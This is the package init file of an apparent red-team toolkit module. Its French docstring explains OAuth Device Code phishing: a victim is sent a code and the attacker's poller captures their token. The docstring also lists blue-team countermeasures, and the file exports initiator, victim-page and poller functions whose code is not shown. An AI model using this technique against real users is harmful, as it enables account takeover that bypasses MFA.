"""
attack/device_code — Device Code Phishing
==========================================

Implémente l'attaque "Device Code" : l'attaquant initie un flow OAuth
Device Code Authorization sur SA machine, obtient un code court
(ex: ABC-DEF-XYZ), puis envoie ce code à la victime via email/Teams.
Quand la victime entre le code sur https://microsoft.com/devicelogin,
**c'est l'attaquant qui se connecte** sur la machine de l'attaquant.

Pourquoi c'est dévastateur :
- Aucun mot de passe saisi par la victime
- Aucun FIDO2 requis (le code suffit)
- Fonctionne contre n'importe quel service supportant OAuth Device Code
  (Microsoft, Google, GitHub, Slack, etc.)
- Idéal contre populations non-techniques
- Contourne la plupart des MFA

Contre-mesures Blue Team (phase 2) :
- Monitoring des device codes consommés (Entra ID logs)
- Géolocalisation : device code consommé hors de l'IP attendue
- Limitation du nombre de device codes actifs par tenant
- Number matching / additional context
- Bloquer les device codes pour les apps non-approuvées

Architecture :
- initiator.py : initie le flow côté serveur (demande device_code)
- victim_view.py : page web que la victime voit (saisie du user_code)
- poller.py    : poll en arrière-plan pour récupérer le token
"""

from .initiator import DeviceCodeFlow, DeviceCodeInitiator, initiate_device_code_flow
from .poller import DeviceCodePoller, start_polling, start_polling_async
from .victim_view import generate_victim_page, get_victim_page_html, render_victim_page

__all__ = [
    "DeviceCodeFlow",
    "DeviceCodeInitiator",
    "DeviceCodePoller",
    "generate_victim_page",
    "get_victim_page_html",
    "initiate_device_code_flow",
    "render_victim_page",
    "start_polling",
    "start_polling_async",
]
